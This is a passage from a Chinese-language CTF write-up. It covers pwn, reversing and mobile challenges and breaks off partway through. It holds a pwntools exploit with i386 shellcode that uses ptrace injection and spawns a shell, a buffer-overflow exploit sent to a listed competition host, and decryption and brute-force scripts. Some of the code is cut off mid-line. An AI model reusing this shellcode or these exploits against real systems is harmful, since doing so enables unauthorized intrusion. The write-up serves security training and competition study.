    def limu16(x):
        return c_uint16(x).value
    def limu32(x):
        return c_uint32(x).value
    # define interactive functions here
    def menu():
        return ru('option:n')
    def setarch(index):
        menu()
        sl('4')
        menu()
        sl(str(index))
        return
    def genshellcode():
        menu()
        sl('3')
        return
    def setcall(name):
        menu()
        sl('1')
        ru('name:')
        sl(name)
        return
    def addcall(name, num, argcount, args):
        menu()
        sl('2')
        ru('name')
        sl(name)
        ru('number')
        sl(str(num))
        ru('(argc)')
        sl(str(argcount))
        for pair in args:
            ru('stop')
            sl(str(pair[0]))
            ru('value')
            sl(pair[1])
        ru('stop')
        sl('0')
        return
    def leavemsg(length, content):
        menu()
        sl('5')
        ru('length')
        sl(str(length))
        ru('message')
        if len(content) != length: sl(content)
        else: sn(content)
        return
    # define exploit function here
    def pwn():
        if DEBUG: gdb.attach(io)
        # uid = 0
        shell_stage1 = '''
        #define BSS_ADDR 0x0814D010
        xor eax, eax
        mov al, 3
        xor ebx, ebx
        mov ecx, BSS_ADDR
        mov edx, 0x12345678
        int 0x80
        mov eax, BSS_ADDR
        call eax
        xor eax, eax
        inc eax
        int 0x80
        '''
        shellasm = '''
        #define PUTS_ADDR 0x08048D30
        #define PRINTF_ADDR 0x08048C70
        #define NUM_STR 0x0804B469
        #define STR_STR 0x0804AEB2
        #define PTRACE_ID 26
        #define GETPPID_ID 64
        #define SPIRNTF_ADDR 0x08048B20
        #define BSS_ADDR 0x0814c010 
        mov eax, GETPPID_ID
        int 0x80
        mov ebx, PTRACE_ATTACH
        mov ecx, eax
        mov eax, PTRACE_ID
        xor edx, edx
        xor esi, esi
        int 0x80
        test eax, eax
        js failed
        jmp next_stage
        get_shellcode:
        pop edi
        mov ebp, 0x20
        mov edx, 0x08049E0D
        write_shellcode:
        mov ebx, PTRACE_POKETEXT
        mov esi, dword ptr [edi]
        mov eax, PTRACE_ID
        int 0x80
        test eax, eax
        js write_shellcode
        mov ebx, 0x100000
        wait:
        dec ebx
        jnz wait
        add edx, 4
        add edi, 4
        dec ebp
        test ebp, ebp
        jnz write_shellcode
    detach:
        mov ebx, PTRACE_DETACH
        xor edx, edx
        xor esi, esi
        mov eax, PTRACE_ID
        int 0x80
        mov eax, 1
        int 0x80
        failed:
        mov eax, PUTS_ADDR
        push NUM_STR
        call eax
        mov eax, 1
        int 0x80
        next_stage:
        call get_shellcode
        '''
        sc = asm(shell_stage1, arch='i386')
        sc = sc.rjust(0x600, "x90")
        assert 'n' not in sc
        assert 'x00' not in sc
        sc2 = asm(shellasm, arch='i386')
        sc2 += asm(shellcraft.i386.linux.sh())
        payload = []
        RANGE = 1
        payload = [[-10, p32(0x08048D30)]]
        addcall('ABCDABCDABCDABCD', 0, -1, payload)
        setcall('ABCDABCDABCDABCD')
        genshellcode()
        leak = ru('n')
        if len(leak) 
修改之处是，原题中 xor 的是当前计算出的输出的长度，而本题是输入的长度，故一直为 0x27，另外本题只循环到1 。解题脚本：
    import std.range : cycle, zip;
    import std.conv : to, hexString;
    import std.stdio;
    char[] enc(char[] data, string base ,int i) {
        auto len = cast(char) to!int(base.length);
        auto c = cycle(base);
        char[] res;
        foreach (tup; zip(c, data))
        {
            res ~= tup[0] ^ tup[1] ^ 0x27;
        }
        writeln(res);
        return res;
    }
    int main() {
        auto data = hexString!"585d5543506c2474252727272023222623277327257520212527772774247420702f202721756b";
        char[] res = data.dup;
        for (int i = 499; i >= 1; --i) {
            string base = to!string(i);
            res = enc(res, base ~ base ~ base , 499-i);
            writeln(base ~ base ~ base);
        }
        writeln(res);
        return 0;
    }
**first**
程序先读取输入，然后开启6个线程去计算输入的6部分的 md5，每个部分都是4个字符。如果
md5匹配就把输入存进一个新的数组。然后校验这个新的数组是不是所有字符都合法，如果是的话就输出。
程序的关键点在于6个线程的执行顺序是随机的，程序开始的时候产生了6个随机数，即为每个线程的延迟时间。而且线程的执行顺序会影响到最终结果（后面有个 xor
i，顺序错了字符就乱了）。6个线程的执行顺序是6！= 720种。
只要爆破这720种就能拿到 flag。
然而比赛的时候非常幸运，第二次运行就拿到了看起来非常像 flag 的字符串，猜猜改改提交就过了。
**Mobile**
* * *
**vsvs**
先爆破code，得到第一层code为22，然后有个溢出，直接传/bin/sh就能拿flag了：
    #!/usr/bin/python
    # -*- coding: utf-8 -*-    from pwn import *
    import time
    REMOTE = 0
    LOCAL_REMOTE = 1
    LOCAL = 2
    rhost = "218.2.197.235"
    rport = 23749 
    flag = REMOTE
    debug = 0
    def GetConnection():
        if flag == LOCAL_REMOTE:
            conn = remote(lhost,lport)
            libc_addr = libc_addr_local
        elif flag == REMOTE:
            conn = remote(rhost,rport)
            libc_addr = libc_addr_remote
        elif flag == LOCAL:
            conn = process(local_bin)
            libc_addr = libc_addr_local
        return conn,libc_addr
    exp = 1024*"d" + "/bin/sh"
    conn,libc_addr = GetConnection()
    conn.sendlineafter("access code:n","22")
    conn.sendlineafter("input:",exp)
    conn.sendlineafter("?",exp)
    conn.interactive()
    easycrack
apk主要逻辑都在so里面，先把包名做了一些操作后和输入异或，然后rc4加密，秘钥是I_am_the_key，解密脚本如下：
    # -*- coding: utf-8 -*-    import random, base64,binascii
    from hashlib import sha1
    def crypt(data, key):
        """RC4 algorithm"""
        x = 0
        box = range(256)
        for i in range(256):
            x = (x + box[i] + ord(key[i % len(key)])) % 256
            box[i], box[x] = box[x], box[i]
        x = y = 0
        out = []
        for char in data:
            x = (x + 1) % 256
            y = (y + box[x]) % 256
            box[x], box[y] = box[y], box[x]
            out.append(chr(ord(char) ^ box[(box[x] + box[y]) % 256]))
        return ''.join(out)
    # 需要加密的数据
    data = '7U'Y;J'
    # 密钥
    key = 'I_am_the_key'
    key2 = 'V7D=^,M.E'
    ori = "abcdef"
    enc1 = ""
    dec = binascii.a2b_hex("C8E4EF0E4DCCA683088134F8635E970EEAD9E277F314869F7EF5198A2AA4")
    # 解码
    decoded_data = crypt(data=dec, key=key)
    print decoded_data ,len(decoded_data)
    final = []
    j = 0
    m = 0
    length = len(key2)
    for i in decoded_data:
        if j>=length:
            j = 0
        final.append(chr(ord(key2[j])^ord(i)))
        print key2[j],"".join(final),hex(ord(key2[j])^ord(i))
        j+=1
        m+=1
**littlerotatorgame**
apk通过native
activity实现所有的界面操作，通过加速度传感器获取当前设备的x，y，z坐标然后进行判断，so里面用ollvm混淆了但是计算flag的函数比较明显，而且计算flag的参数只有一个int值，所以可以爆破：
    #include
    int j_j___modsi3(int a,int b)
    {
      return a%b;
    }
    int j_j___divsi3(int a,int b)
    {
      return a/b;
    }
    char flg(int a1, char *out)